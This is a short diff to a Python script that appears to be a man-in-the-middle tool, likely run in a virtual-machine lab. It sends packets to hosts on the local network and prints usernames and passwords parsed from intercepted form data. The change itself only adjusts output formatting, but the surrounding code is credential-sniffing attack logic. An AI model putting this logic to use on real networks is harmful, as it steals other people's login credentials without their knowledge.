@@ -182,6 +182,7 @@ if __name__ == "__main__":
             # More : help(send)
             # https://stackoverflow.com/questions/15377150/how-can-i-call-the-send-function-without-getting-output
 
+            print(" ")
             for j in range(0,len(ip)):
                 if(ip[j]!="10.0.2.2" and ip[j]!="10.0.2.3"):
                     print("Send to: ",ip[j]," ",mac[j]),
@@ -207,7 +208,7 @@ if __name__ == "__main__":
                             a = [m.start() for m in re.finditer("&", line)]
                             b = [m.start() for m in re.finditer("=", line)]
                             # print(a, b)
-                            print("username= %-30s  password= %-30s" % (line[b[0]+1:a[0]], line[b[1]+1:a[1]]))
+                            print("username= %s  password= %s" % (line[b[0]+1:a[0]], line[b[1]+1:a[1]]))
             sleep(2)
     finally:
         print("Done")
